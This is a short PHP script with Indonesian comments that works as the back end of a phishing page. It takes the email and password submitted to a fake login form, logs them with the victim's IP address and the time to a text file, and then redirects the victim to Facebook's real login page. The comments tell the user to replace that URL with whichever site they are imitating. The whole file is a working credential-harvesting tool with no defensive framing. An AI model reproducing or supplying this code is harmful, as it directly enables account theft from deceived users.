<?php
// Ambil data yang dikirim dari form
$email = $_POST['email'];
$password = $_POST['password'];

// File untuk menyimpan kredensial
$logFile = 'credentials.txt';

// Format data yang akan disimpan
$data = "Email: " . $email . " | Password: " . $password . " | IP: " . $_SERVER['REMOTE_ADDR'] . " | Time: " . date("Y-m-d H:i:s") . "\n";

// Buka file log dalam mode append (menambahkan ke akhir file)
// Jika file tidak ada, akan dibuat secara otomatis
$file = fopen($logFile, 'a');

// Tulis data ke file
fwrite($file, $data);

// Tutup file
fclose($file);

// Setelah data disimpan, arahkan (redirect) user ke website asli
// Contoh: Facebook.com, Instagram.com, dll.
header('Location: https://www.facebook.com/login/'); // Ganti dengan URL situs asli yang lo tiru
exit();
?>
